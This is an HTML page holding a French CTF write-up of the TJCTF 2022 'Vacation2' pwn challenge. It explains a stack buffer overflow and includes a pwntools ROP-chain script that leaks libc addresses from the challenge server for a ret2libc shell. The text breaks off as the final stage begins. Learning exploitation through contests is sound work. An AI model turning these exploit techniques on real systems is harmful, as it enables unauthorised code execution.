@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <link rel="icon" href="/favicon.ico">
+
+  <title>
+    Vacation2 | Tjctf 2022 | Catégorie Pwn - Vozec&#39;s Blog
+  </title>
+
+  <meta name="description" content="Vacation2 | Tjctf 2022" />
+  <meta name="keywords" content="tuto,reverse,howto,ctf,vacation2,ctftime,tjctf,ropchain,rop,ret2libc,vozec" />
+  <meta name="generator" content="Hugo 0.105.0">
+
+  <link rel="stylesheet" href="https://vozec.fr/css/main.css" />
+
+  
+  
+
+  <meta property="og:title" content="Vacation2 | Tjctf 2022 | Catégorie Pwn" />
+<meta property="og:description" content="Vacation2 | Tjctf 2022" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://vozec.fr/writeups/vacation2-tjctf-2022/" /><meta property="og:image" content="https://vozec.fr/vozec.png"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2022-05-15T12:00:00+00:00" />
+<meta property="article:modified_time" content="2022-05-15T12:00:00+00:00" />
+
+
+
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://vozec.fr/vozec.png"/>
+
+<meta name="twitter:title" content="Vacation2 | Tjctf 2022 | Catégorie Pwn"/>
+<meta name="twitter:description" content="Vacation2 | Tjctf 2022"/>
+
+
+  <meta itemprop="name" content="Vacation2 | Tjctf 2022 | Catégorie Pwn">
+<meta itemprop="description" content="Vacation2 | Tjctf 2022"><meta itemprop="datePublished" content="2022-05-15T12:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-05-15T12:00:00+00:00" />
+<meta itemprop="wordCount" content="1052"><meta itemprop="image" content="https://vozec.fr/vozec.png"/>
+<meta itemprop="keywords" content="pwn,tuto,writeup," />
+
+  <meta itemprop="name" content="Vacation2 | Tjctf 2022 | Catégorie Pwn">
+<meta itemprop="description" content="Vacation2 | Tjctf 2022"><meta itemprop="datePublished" content="2022-05-15T12:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-05-15T12:00:00+00:00" />
+<meta itemprop="wordCount" content="1052"><meta itemprop="image" content="https://vozec.fr/vozec.png"/>
+<meta itemprop="keywords" content="pwn,tuto,writeup," />
+</head><body class="flex relative h-full min-h-screen"><aside
+  class="will-change-transform transform transition-transform -translate-x-full absolute top-0 left-0 md:relative md:translate-x-0 w-3/4 md:w-60 h-full min-h-screen p-3 bg-slate-50 dark:bg-slate-800 border-r border-slate-200 dark:border-slate-700 flex flex-col gap-2.5 z-20 sidebar">
+  <p class="font-bold mb-5 flex items-center gap-2">
+    <button aria-label="Close sidebar"
+      class="md:hidden menu-trigger-close p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-6 w-6" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <line x1="18" y1="6" x2="6" y2="18" />
+  <line x1="6" y1="6" x2="18" y2="18" />
+</svg></button>
+    <a href="https://vozec.fr/" class="px-2">
+      <span>Vozec&#39;s Blog</span>
+    </a>
+    <button aria-label="Toggle dark mode"
+      class="dark-mode-toggle p-2 rounded border dark:border-slate-700 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <circle cx="12" cy="12" r="4" />
+  <path d="M3 12h1M12 3v1M20 12h1M12 20v1M5.6 5.6l.7 .7M18.4 5.6l-.7 .7M17.7 17.7l.7 .7M6.3 17.7l-.7 .7" />
+</svg></button>
+  </p>
+
+  
+  <ul class="list-none flex flex-col gap-1">
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/" >
+        <span>Home</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  text-slate-400 font-semibold pb-0 pl-1 border-b cursor-default pointer-events-none "
+        href="#" >
+        <span>C͟o͟n͟t͟e͟n͟t͟ ✒️</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/articles" >
+        <span> 〰️ Articles</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/writeups" >
+        <span> 〰️ Writeups</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  text-slate-400 font-semibold pb-0 pl-1 border-b cursor-default pointer-events-none "
+        href="#" >
+        <span>F͟r͟o͟m͟ 0 T͟o͟ C͟r͟y͟p͟t͟o͟ 🔐</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/crypto-rsa" >
+        <span> 〰️ Rsa Courses</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/crypto-aes" >
+        <span> 〰️ Aes Courses</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/crypto-other" >
+        <span> 〰️ Other Courses</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  text-slate-400 font-semibold pb-0 pl-1 border-b cursor-default pointer-events-none "
+        href="#" >
+        <span>A͟b͟o͟u͟t͟ M͟e͟👀</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/contact" >
+        <span> 〰️ Contact Me</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="https://flag-poisoning.fr"  target="_blank"
+        rel="noopener" >
+        <span> 〰️ My Ctf Team </span>
+        
+        <span><svg class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <path d="M11 7h-5a2 2 0 0 0 -2 2v9a2 2 0 0 0 2 2h9a2 2 0 0 0 2 -2v-5" />
+  <line x1="10" y1="14" x2="20" y2="4" />
+  <polyline points="15 4 20 4 20 9" />
+</svg></span>
+        
+      </a>
+    </li>
+    
+  </ul>
+
+  <div class="flex-1"></div>
+
+  
+
+  <ul class="list-none flex flex-wrap justify-center gap-1 pt-2 border-t border-slate-200 dark:border-slate-600">
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="https://twitter.com/Vozec1" target="_blank" rel="noopener noreferrer">
+        <span class="sr-only">Twitter</span>
+        
+        <span><svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+  stroke-linecap="round" stroke-linejoin="round">
+  <path
+    d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z" />
+</svg></span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="https://github.com/Vozec" target="_blank" rel="noopener noreferrer">
+        <span class="sr-only">GitHub</span>
+        
+        <span><svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+  stroke-linecap="round" stroke-linejoin="round">
+  <path
+    d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" />
+</svg></span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="https://www.linkedin.com/in/arthur-deloffre-844b7a221/" target="_blank" rel="noopener noreferrer">
+        <span class="sr-only">LinkedIn</span>
+        
+        <span><svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+  stroke-linecap="round" stroke-linejoin="round">
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z" />
+  <rect x="2" y="9" width="4" height="12" />
+  <circle cx="4" cy="4" r="2" />
+</svg></span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="mailto:arthursd444@gmail.com" target="_blank" rel="noopener noreferrer">
+        <span class="sr-only">Email</span>
+        
+        <span><svg class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <rect x="3" y="5" width="18" height="14" rx="2" />
+  <polyline points="3 7 12 13 21 7" />
+</svg></span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm block text-slate-800 dark:text-slate-50  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="https://www.instagram.com/arthur_dlfr/" target="_blank" rel="noopener noreferrer">
+        <span class="sr-only">Instagram</span>
+        
+        <span><svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+  stroke-linecap="round" stroke-linejoin="round">
+  <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
+  <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" />
+  <line x1="17.5" y1="6.5" x2="17.51" y2="6.5" />
+</svg></span>
+        
+      </a>
+    </li>
+    
+  </ul>
+</aside>
+
+<div
+  class="fixed bg-slate-700 bg-opacity-5 transition duration-200 ease-in-out inset-0 z-10 pointer-events-auto md:hidden left-0 top-0 w-full h-full hidden menu-overlay">
+</div>
+
+<button aria-label="Toggle Sidebar"
+  class="md:hidden absolute top-3 left-3 z-10 menu-trigger p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-100"><svg class="h-6 w-6" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <line x1="4" y1="6" x2="20" y2="6" />
+  <line x1="4" y1="12" x2="20" y2="12" />
+  <line x1="4" y1="18" x2="16" y2="18" />
+</svg></button>
+<div class="flex-1">
+
+
+
+
+<div class="flex max-h-screen relative overflow-y-auto h-full">
+  
+  <article class="px-6 py-20 w-full mx-auto prose lg:prose-lg dark:prose-invert h-fit prose-img:mx-auto">
+    
+    <a href="https://vozec.fr/writeups/" class="!no-underline !text-slate-500 !mb-2 !inline-block !font-normal !text-sm hover:!text-slate-700 dark:hover:!text-slate-400">← Back to list</a>
+
+    
+    <h1 class="!mb-2">Vacation2 | Tjctf 2022 | Catégorie Pwn</h1>
+    
+    <p class="text-sm text-slate-500 !mb-8">May 15, 2022</p>
+    
+
+    
+
+    <h1 id="vacation2--tjctf-2022">Vacation2 | Tjctf 2022</h1>
+<h2 id="fichiers">Fichier(s)</h2>
+<ul>
+<li><a href="./files/challenge.zip" >Challenge files</a></li>
+</ul>
+<h2 id="necessaires">Necessaires</h2>
+<ul>
+<li>Netcat</li>
+<li>Python3 (+ pwntool)</li>
+</ul>
+<h2 id="flag">Flag</h2>
+<pre tabindex="0"><code>tjctf{w3_g0_wher3_w3_w4nt_t0!_66f7020620e343ff}
+</code></pre><h2 id="solution-détaillée">Solution détaillée</h2>
+<p>Le but du challenge est d&rsquo;exploiter un buffer overflow pour ainsi construire une ropchain et ainsi pouvoir prendre le contrôle du binaire grâce à une attaque ret2libc.</p>
+<h5 id="un-peu-dexplication-">Un peu d&rsquo;explication :</h5>
+<p>Voici la source du challenge :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">vacation</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">16</span>];
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#f1fa8c">&#34;Where am I going today?&#34;</span>);
+</span></span><span style="display:flex;"><span>  fgets(buf, <span style="color:#bd93f9">64</span>, stdin);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span>() {
+</span></span><span style="display:flex;"><span>  setbuf(stdout, <span style="color:#8be9fd;font-style:italic">NULL</span>);
+</span></span><span style="display:flex;"><span>  vacation();
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#f1fa8c">&#34;hmm... that doesn&#39;t sound very interesting...&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>On voit ici que le programme crée un buffer de taille <code>16</code> avant de de nous demander une entrée. Puis il renvoie : <code>hmm... that doesn't sound very interesting..</code></p>
+<p>Que se passe t&rsquo;il si on envoie beaucoup plus de charactères ?</p>
+<p><img src="./img/segfault.png" alt="Alt text"></p>
+<p>On à une erreur : <strong>segmentation fault</strong></p>
+<p>Regardons de plus prêt avec gdb , voyons ce qui se passe si on envoie <strong>24 charactères</strong> (16+8 car 64 bits)</p>
+<p><img src="./img/gdb_segfault.png" alt="Alt text"></p>
+<p>On envoie donc :  <code>aaaaaaaaaaaaaaaaaaaaaaaaBBBBBBBB</code>
+On retrouve l&rsquo;erreur <strong>segfault</strong> et on remarque que le registre <strong>RSP</strong> a été réécris avec les 8 derniers <strong>B</strong> . On peut donc rediriger le pointer du binaire vers les adresses qu&rsquo;on veut.</p>
+<p>Nous devons donc trouver l&rsquo;adresse de <strong>/bin/sh</strong> dans la libc distante pour pouvoir avoir un shell intéractif .
+Mais comment obtenir cette adresse ?</p>
+<h3 id="utilisation-dune-ropchain-pour-faire-leak-la-bonne-libc">Utilisation d&rsquo;une Ropchain pour faire leak la bonne libc.</h3>
+<p>Pour le moment, nous n&rsquo;avons que la possibilité de rediriger le pointer vers des adresses choisis .
+On va donc pouvoir crée un mini programme en assembleur : <code>Une ropchain</code> (&ldquo;Return-oriented-programming&rdquo;) .</p>
+<p>Le principe est simple, on va récupérer les adresses des instructions qui précèdent un <strong>ret</strong> : un retour , ainsi une fois exécuté , nôtre mini-programme reviendra au sommet de la pile ; dans nôtre exploit et exécutera la suivante qui à sont tour , s&rsquo;exécutera avant de continuer .. etc ..</p>
+<p>Illustration :
+<em>source: <a href="https://beta.hackndo.com/return-oriented-programming/"  target="_blank" rel="noopener" >hackndo.com</a></em></p>
+<p><img src="./img/rop_example.png" alt="Alt text"></p>
+<p>Nous allons donc grâce à une ropchain , faire leak les adresses des fonctions <strong>fgets</strong> et <strong>puts</strong> pour ainsi identifier la libc utilisé et connaitre l&rsquo;adresse de <strong>/bin/sh</strong></p>
+<p>Grâce à <a href="https://github.com/JonathanSalwan/ROPgadget"  target="_blank" rel="noopener" >RopGadget</a> , on récupère rapidement une adresse de <code>pop rdi ; ret</code> et <code>ret</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /root/software/ROPgadget git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>➜   python3 ROPgadget.py --binary /c/vacation/vacation2 | grep <span style="color:#f1fa8c">&#39;pop rdi ; ret&#39;</span>
+</span></span><span style="display:flex;"><span>0x0000000000401243 : pop rdi ; ret
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /root/software/ROPgadget git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>➜   python3 ROPgadget.py --binary /c/vacation/vacation2 | grep <span style="color:#f1fa8c">&#39;: ret&#39;</span>
+</span></span><span style="display:flex;"><span>0x000000000040101a : ret
+</span></span></code></pre></div><p>On veut donc faire ce programme :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">=</span> overflow
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> ret
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> pop_rdi
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> adresse de la fonction à faire leak
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> adresse de puts pour afficher le leak
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> adresse de la fonction main pour revenir au début du programme
+</span></span></code></pre></div><p>En python :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;critical&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf  <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;./vacation2&#39;</span>)
+</span></span><span style="display:flex;"><span>rop  <span style="color:#ff79c6">=</span> ROP(elf)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">Get_proc</span>():
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span>(args<span style="color:#ff79c6">.</span>REMOTE):
+</span></span><span style="display:flex;"><span>		proc <span style="color:#ff79c6">=</span> remote(<span style="color:#f1fa8c">&#39;tjc.tf&#39;</span>,<span style="color:#bd93f9">31705</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>		proc <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#39;./vacation2&#39;</span>)
+</span></span><span style="display:flex;"><span>	proc<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;Where am I going today?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> proc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">Leak_function</span>(name,proc):
+</span></span><span style="display:flex;"><span>  	payload <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">24</span><span style="color:#ff79c6">*</span><span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#ff79c6">+</span> p64(pop_rdi) <span style="color:#ff79c6">+</span> p64(elf<span style="color:#ff79c6">.</span>got[name]) <span style="color:#ff79c6">+</span> p64(libc_puts_plt)<span style="color:#ff79c6">+</span> p64(ret_main_addr)
+</span></span><span style="display:flex;"><span>  	proc<span style="color:#ff79c6">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>  	Leaked	<span style="color:#ff79c6">=</span> proc<span style="color:#ff79c6">.</span>recvline()[::<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>strip()<span style="color:#ff79c6">.</span>hex()
+</span></span><span style="display:flex;"><span>  	proc<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;Where am I going today?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
+</span></span><span style="display:flex;"><span>  	<span style="color:#ff79c6">return</span> Leaked
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">## Adress</span>
+</span></span><span style="display:flex;"><span>ret_main_addr	<span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;vacation&#39;</span>]
+</span></span><span style="display:flex;"><span>libc_puts_plt	<span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>libc_fgets		<span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;fgets&#39;</span>]
+</span></span><span style="display:flex;"><span>libc_setbuf		<span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;setbuf&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000401243</span>
+</span></span><span style="display:flex;"><span>ret 	<span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x000000000040101a</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">    Address:&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Ret2start   : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(ret_main_addr))
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Puts        : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc_puts_plt))
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Fgets       : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc_fgets))
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Setbuf      : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc_setbuf))
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Pop_rdi     : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(pop_rdi))
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Ret         : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(ret))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#ff79c6">=</span> Get_proc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Leaked_puts	 <span style="color:#ff79c6">=</span> Leak_function(<span style="color:#f1fa8c">&#34;puts&#34;</span>,proc)
+</span></span><span style="display:flex;"><span>Leaked_fgets <span style="color:#ff79c6">=</span> Leak_function(<span style="color:#f1fa8c">&#34;fgets&#34;</span>,proc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;    Leaked with Rop:&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Puts  : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span>Leaked_puts)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Fgets : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span>Leaked_fgets)
+</span></span></code></pre></div><p>Résultat :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c/vacation
+</span></span><span style="display:flex;"><span>➜   python3 vacation2.py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Address:
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Ret2start   : 0x401176
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Puts        : 0x401064
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Fgets       : 0x401084
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Setbuf      : 0x401074
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Pop_rdi     : 0x401243
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Ret         : 0x40101a
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Leaked with Rop:
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Puts  : 7f1d26c31de0
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Fgets : 7f1d26c301b0
+</span></span></code></pre></div><p>Puis on va se rendre sur <a href="https://libc.rip/"  target="_blank" rel="noopener" >libc.rip</a> pour identifier la bonne libc utilisé à distance :
+On trouve : <strong><a href="./files/libc6_2.31-0ubuntu9.7_amd64.so" >libc6_2.31-0ubuntu9.7_amd64.so</a></strong></p>
+<h3 id="fin-de-lexploitation-grâce-à-un-ret2libc">Fin de l&rsquo;exploitation grâce à un ret2libc.</h3>
+<p>Maintenant que nous avons la bonne libc , nous pouvons la charger dans notre programme et nous pouvons resituer l&rsquo;address de celle-ci grâce au leak du premier ropchain:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>libc <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;libc6_2.31-0ubuntu9.7_amd64.so&#39;</span>)
